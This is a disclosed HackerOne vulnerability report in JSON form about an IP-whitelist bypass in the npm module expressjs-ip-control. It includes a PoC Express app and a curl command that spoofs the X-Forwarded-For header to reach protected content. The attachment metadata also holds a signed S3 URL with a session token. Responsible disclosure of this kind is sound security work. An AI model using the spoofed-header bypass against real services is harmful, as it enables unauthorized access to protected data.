{
  "id": 693788,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTM3ODg=",
  "url": "https://hackerone.com/reports/693788",
  "title": "[expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-09-12T15:55:04.541Z",
  "submitted_at": "2019-09-12T15:55:04.541Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mik317",
    "url": "/mik317",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-29T19:27:29.116Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-09-29T19:27:20.544Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `unauthenticated access/authorization bypass` issue in the `expressjs-ip-control` module.\nIt allows to `bypass` the `whitelist IP check` in order to bypass the `authorization check` and possibly `expose sensitive datas`.\n\n# Module\n**module name:** [MODULE NAME]\n**version:** [MODULE VERSION]\n**npm page:** `https://www.npmjs.com/package/[MODULE NAME]`\n\n## Module Description\n> Expressjs package to whitelist IP addresses also support for x-forwarded-for ip addresses.\n\n## Module Stats\n[`N/A`] downloads in the last day\n[`17`] downloads in the last week\n[`~250`] downloads in the last month\n\n## Vulnerability Description\nThe issue arises because the module checks if is present in the request a `X-Forwarded-For` header, and bases the authorization on that check ... as we know, that header can be simply manipulated, in order to `bypass` the protection, leading to `sensitive information disclosure`.\n\n## Steps To Reproduce:\n1. Install the module: `npm i expressjs-ip-control`\n2. Create a PoC file like this:\n\n```js\n// poc.js\nconst express = require('express')\nconst app = express()\nconst ipControl = require('expressjs-ip-control')\n \napp.get('/', ipControl({\n    whitelist: '127.0.0.1, 192.168.10.10',\n}), (req, res) => res.send('SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC'))\n\napp.listen(3000)\n```\n3. Run the PoC: `node poc.js`\n4. Now, test the `whitelist` protection with this commands: \n\n```bash\ncurl 'http://localhost:3000/' # Obtain *403* response --> *You do not have rights to visit this page*\ncurl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1' # Obtain *200* response --> secret token\n```\n{F581254}\n\n## Patch\n> Don't check for the `x-forwarded-for` header, has it can be changed leading to `IP whitelist` bypass\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI'm not sure you'll consider this issue valid, as the `x-forwarded-for` header support, is a feature of the library. However, this \"feature\" leads to the issue I've described. If you won't consider this valid, pls be clement and also, can I know if you consider valid the same issue applied to a `blacklist` module? (in that case, it could allow attackers blacklisted to change IP without change PC and so continue DOS/spam the server :))\n\n## Impact\n\n`Whitelist IP bypass`, leading to`Authorization issue` on `expressjs-ip-control`, may lead to `sensitive information disclosure`",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 581254,
      "file_name": "Screenshot_from_2019-09-12_15-36-06.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvjoQSEDV8hKM5gkkt4AHTrw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-12_15-36-06.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-12_15-36-06.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6UDGEAWX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T083747Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtomjzste%2FJyV7XywzlEJQYeqQ2gl1GbRXR68XAax2ZAIhAOXu4GCq8m%2Baons%2BoeD1F5wi6eBebA%2Flbq7z6%2BT5S13%2BKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igz0Z1zn%2F0sHyj01UDIqjwU1Vm8BSQ8mwy%2F6URVMkd4PMFnas4kNcnyAhizE%2FtAF0Zo2Rf6osehF9A0vFXUqzBhf%2Bx0tn9BCykRmXL4LADQW2zG0CjvKZ8o0FRejBpfc4ABGr0s2kaBm20dZN46YJj%2Fci9fvZZXks24BJ4R9FMOr8BTuVz1b6QJuLu5ZvF5SijVlIc7qDZpcNOQwUKQGZCKhAiyKxV%2FPdj2wtABwdYRFChvP5HrC0OEE1b1JkM2XVLw3MrttmYe79K24scbCWlu8TNxqz0c%2FHPqayQ2dcErgzkMB%2BG35OzxBXU6KuQhgq3x1CaBaQmC53tpFEwzHDIqZAjrCB3v2l1n8xP9RpfzVSUPz1Pw0mgEQ9vCVLos1WkT5c%2BVghNfCgtN3ZZNakSb0Xo63aLDeyNrDmRQ8N%2B0cAT39RFVD0dFvarC3AlomGqz73cmjaGlZBK6npaBOjh1VijNsw9IEssbOxzts8eaEYK04YEGZiArUQdOKUa6NSYTFNE9DySi12E6zuoqSUQ1%2BM3xg5%2F9a2ezeWFPMfkI%2Fk9xd2H8QobL5HDm%2BQxoo1Xd6C5TY0CDPjWc%2FVJ3Vg%2FujtX7B4YRVGnIhw%2FoVcet%2B7BLsy8samnFShP75uWkw2TESNibZccSBFG796cZdoI9LTNSeL4unuO2lr5qZbVZ%2B%2FQUOVomf6UIfEiz9ILQjOk0%2BeK70YMy6KsInBS4cs6KqHtW6uE0qiPxPC9Sf7YzmKg%2BNKHU8n9%2FJw%2FqdR08dm8FIvGCU3ChxBLT3c25ARE1rgNzEq8WwPQrJLsh4rw%2BPPKCi%2FaLX%2BPeMqnZoxYGJwWYRGsecNgVXF9N06HvTmAyFbl4qGh3DTeqixRHICHUfrCgOj91rnM8kOOeD7hRPMOHkvsYGOrABpQSx1GCRLInHCXgDgl1ei25b5ml%2FW5yrarH%2F4hx%2Bpaa2NMHSkoQOdGhh4sgYrEm%2Fg8oceBhDenU%2FCZmSorsoUVnuQ8C%2FNWEvu2Wg8KqMzrZH7Ek10qtr%2BHD5B7EUJL%2FtIDQV%2BnRfKsDezaCHqPTezQYVw1%2BhPbFCChJ54naSnmcfE3%2FgNFA86zKuNC6LwZ%2B%2FE7Ca5CrnxQljX1VW8ORWPAWCMpgJnIFZwdXgidA9r%2BA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=92f538750823976b618325af2b7eab3018b94b981b4a2456ca1561d6198e748d",
      "file_size": 95721,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-10-29T19:27:20.630Z",
  "allow_singular_disclosure_after": -154444227.0839635,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "pr0f0x01",
    "gr4nd_m4st3r"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
